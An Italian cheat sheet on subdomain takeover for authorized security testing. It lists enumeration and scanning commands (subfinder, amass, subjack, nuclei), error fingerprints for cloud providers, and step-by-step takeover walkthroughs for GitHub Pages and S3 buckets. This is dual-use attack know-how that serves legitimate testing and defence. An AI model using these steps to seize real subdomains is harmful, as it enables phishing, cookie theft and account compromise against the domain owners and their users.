# 🎯 Scheda di riferimento sul subdomain takeover

<!-- language-home-navigation -->
[🏠 Pagina iniziale italiana](../../README.it.md) • [🌐 Languages](../../README.md#-available-languages)

<p align="center">
  <a href="README.tr.md">🇹🇷 Türkçe Sürüm</a> • <a href="README.el.md">🇬🇷 Ελληνικά</a>
</p>

```
  ███████╗██╗   ██╗██████╗ ██████╗  ██████╗ ███╗   ███╗ █████╗ ██╗███╗   ██╗
  ██╔════╝██║   ██║██╔══██╗██╔══██╗██╔═══██╗████╗ ████║██╔══██╗██║████╗  ██║
  ███████╗██║   ██║██████╔╝██║  ██║██║   ██║██╔████╔██║███████║██║██╔██╗ ██║
  ╚════██║██║   ██║██╔══██╗██║  ██║██║   ██║██║╚██╔╝██║██╔══██║██║██║╚██╗██║
  ███████║╚██████╔╝██████╔╝██████╔╝╚██████╔╝██║ ╚═╝ ██║██║  ██║██║██║ ╚████║
  ╚══════╝ ╚═════╝ ╚═════╝ ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝
                ████████╗ █████╗ ██╗  ██╗███████╗ ██████╗ ██╗   ██╗███████╗██████╗ 
                ╚══██╔══╝██╔══██╗██║ ██╔╝██╔════╝██╔═══██╗██║   ██║██╔════╝██╔══██╗
                   ██║   ███████║█████╔╝ █████╗  ██║   ██║██║   ██║█████╗  ██████╔╝
                   ██║   ██╔══██║██╔═██╗ ██╔══╝  ██║   ██║╚██╗ ██╔╝██╔══╝  ██╔══██╗
                   ██║   ██║  ██║██║  ██╗███████╗╚██████╔╝ ╚████╔╝ ███████╗██║  ██║
                   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝ ╚═════╝   ╚═══╝  ╚══════╝╚═╝  ╚═╝
```

> **Nota sui prerequisiti:** un CNAME pendente o un messaggio di errore è un indizio, non la prova che il servizio sia acquisibile. I provider applicano verifiche di proprietà e vincoli diversi, che possono rendere storiche o incomplete le procedure dell’originale. Per esempio, CloudFront richiede un certificato che copra il nome alternativo e GitHub Pages protegge i domini verificati. Anche furto di cookie o compromissione OAuth richiedono condizioni aggiuntive. I fingerprint e i comandi originali restano invariati: vedi [CloudFront](https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/CNAMEs.html) e [verifica dei domini GitHub Pages](https://docs.github.com/en/pages/configuring-a-custom-domain-for-your-github-pages-site/verifying-your-custom-domain-for-github-pages).

---

## 🎯 Che cos’è il subdomain takeover

Il **subdomain takeover**, ossia l’acquisizione di un sottodominio, si verifica quando un sottodominio punta tramite CNAME a un servizio rimosso e un attaccante può acquisire quel servizio per pubblicare contenuti malevoli.

### Impatto
- 🔴 **Phishing** - Ospitare pagine di phishing credibili
- 🔴 **Furto di cookie** - Sottrarre cookie impostati sul dominio padre
- 🔴 **Compromissione degli account** - Intercettare i callback OAuth
- 🔴 **Danno alla reputazione** - Pubblicare contenuti malevoli

---

## 🔍 Metodo di individuazione

### Passo 1: enumera i sottodomini
```bash
# Più strumenti per una copertura migliore
subfinder -d target.com -o subs.txt
amass enum -d target.com -o amass.txt
assetfinder --subs-only target.com >> subs.txt

# Unisci ed elimina i duplicati
cat subs.txt amass.txt | sort -u > all_subs.txt
```

### Passo 2: individua i CNAME
```bash
# Controlla i record DNS
cat all_subs.txt | while read sub; do
    cname=$(dig CNAME +short $sub)
    if [ ! -z "$cname" ]; then
        echo "$sub -> $cname"
    fi
done

# Oppure usa dnsrecon
dnsrecon -d target.com -t crt
```

### Passo 3: verifica i CNAME pendenti
```bash
# Verifica manuale
dig CNAME subdomain.target.com +short
# Restituisce: something.cloudfront.net
# Poi verifica se quel servizio non è assegnato

# httpx per i codici di stato
cat all_subs.txt | httpx -status-code -title -tech-detect -no-color
```

---

## 🛠️ Strumenti automatizzati

### Subjack
```bash
# Installazione
go install github.com/haccer/subjack@latest

# Scansione
subjack -w subdomains.txt -t 100 -timeout 30 -o results.txt -ssl

# Con le impronte identificative (fingerprint)
subjack -w subdomains.txt -t 100 -a -timeout 30 -o results.txt -ssl
```

### Nuclei (template per il takeover)
```bash
# Uso dei template di nuclei
nuclei -l subdomains.txt -t ~/nuclei-templates/takeovers/ -o takeovers.txt

# Verifiche specifiche per il takeover
nuclei -l subdomains.txt -t ~/nuclei-templates/takeovers/subdomain-takeover.yaml
```

### Can-I-Take-Over-XYZ
```bash
# Consulta il repository GitHub per le impronte identificative
# https://github.com/EdOverflow/can-i-take-over-xyz

# Usa le impronte manualmente o con strumenti automatizzati
```

---

## 📋 Servizi vulnerabili e impronte identificative

### AWS S3
```
CNAME: bucket.s3.amazonaws.com
CNAME: bucket.s3-website-region.amazonaws.com

Impronta: "NoSuchBucket"
Impronta: "The specified bucket does not exist"

Takeover: crea un bucket con lo stesso nome
```

### AWS CloudFront
```
CNAME: xxxxx.cloudfront.net

Impronta: "Bad Request"
Impronta: "ERROR: The request could not be satisfied"

Takeover: crea una distribuzione CloudFront con lo stesso dominio alternativo
```

### GitHub Pages
```
CNAME: username.github.io
CNAME: organization.github.io

Impronta: "There isn't a GitHub Pages site here"

Takeover:
1. Crea il repository username.github.io
2. Aggiungi un file CNAME con il sottodominio bersaglio
```

### Heroku
```
CNAME: xxx.herokuapp.com
CNAME: xxx.herokudns.com

Impronta: "No such app"
Impronta: "There's nothing here, yet"

Takeover: crea un’app Heroku con lo stesso nome
```

### Azure
```
CNAME: xxx.azurewebsites.net
CNAME: xxx.cloudapp.azure.com
CNAME: xxx.blob.core.windows.net

Impronta: "404 - Web Site not found"

Takeover: crea una risorsa con lo stesso nome
```

### Shopify
```
CNAME: shops.myshopify.com

Impronta: "Sorry, this shop is currently unavailable"
Impronta: "Only one step left"

Takeover: crea un negozio Shopify e aggiungi il dominio personalizzato
```

### WordPress.com
```
CNAME: xxx.wordpress.com

Impronta: "Do you want to register *.wordpress.com?"

Takeover: registra il sottodominio su WordPress.com
```

### Zendesk
```
CNAME: xxx.zendesk.com

Impronta: "Help Center Closed"
Impronta: "This help center no longer exists"

Takeover: non sempre possibile, dipende dalla configurazione di Zendesk
```

### Fastly
```
CNAME: xxx.fastly.net

Impronta: "Fastly error: unknown domain"

Takeover: aggiungi il dominio al servizio Fastly
```

### Pantheon
```
CNAME: xxx.pantheonsite.io

Impronta: "The gods are wise but do not know of the site"
Impronta: "404 error unknown site!"

Takeover: aggiungi un sito su Pantheon
```

---

## 🔥 Passaggi di sfruttamento

### Esempio: takeover di GitHub Pages

```bash
# 1. Individua un sottodominio vulnerabile
dig CNAME blog.target.com
# Restituisce: target.github.io (ma il repository non esiste)

# 2. Crea il repository GitHub
# Crea: yourusername/target (oppure org/target)

# 3. Abilita GitHub Pages nelle impostazioni del repository

# 4. Aggiungi un file CNAME con il contenuto:
blog.target.com

# 5. Attendi la propagazione DNS

# 6. Verifica il takeover
curl https://blog.target.com
```

### Esempio: takeover di S3

```bash
# 1. Conferma la vulnerabilità
dig CNAME assets.target.com
# Restituisce: assets-target.s3.amazonaws.com

curl http://assets-target.s3.amazonaws.com
# Restituisce: NoSuchBucket

# 2. Crea un bucket S3 nella stessa regione
aws s3 mb s3://assets-target --region us-east-1

# 3. Configura il bucket
# Aggiungi l’hosting del sito web o l’accesso pubblico

# 4. Carica il contenuto
echo "Subdomain Takeover PoC" > index.html
aws s3 cp index.html s3://assets-target/

# 5. Verifica
curl http://assets.target.com
```

---

## 📊 Riferimento rapido

### Individuazione dei servizi vulnerabili

| Servizio | Schema CNAME | Impronta |
|---------|---------------|-------------|
| AWS S3 | `*.s3.amazonaws.com` | NoSuchBucket |
| CloudFront | `*.cloudfront.net` | Bad Request |
| GitHub | `*.github.io` | No GitHub Pages |
| Heroku | `*.herokuapp.com` | No such app |
| Azure | `*.azurewebsites.net` | 404 Web Site not found |
| Shopify | `shops.myshopify.com` | Shop unavailable |

### Checklist del takeover

```markdown
- [ ] Enumera tutti i sottodomini
- [ ] Individua i CNAME
- [ ] Controlla i record pendenti
- [ ] Confronta le impronte identificative
- [ ] Verifica che il servizio non sia assegnato
- [ ] Tenta il takeover nel rispetto delle regole etiche
- [ ] Documenta e prepara il report
```

---

## 🛠️ Riepilogo degli strumenti

| Strumento | Scopo |
|------|---------|
| **subjack** | Individuazione automatizzata dei takeover |
| **nuclei** | Scansione basata su template |
| **can-i-take-over-xyz** | Riferimento per le impronte identificative |
| **dnsrecon** | Enumerazione DNS |
| **subfinder** | Individuazione dei sottodomini |
| **httpx** | Verifica delle risposte HTTP |

---

## 📚 Risorse

- [can-i-take-over-xyz](https://github.com/EdOverflow/can-i-take-over-xyz)
- [Subjack](https://github.com/haccer/subjack)
- [Nuclei Takeover Templates](https://github.com/projectdiscovery/nuclei-templates/tree/main/takeovers)

---

<p align="center">
  <b>🎯 Acquisisci quei sottodomini!</b><br>
  <i>Solo per test autorizzati!</i>
</p>
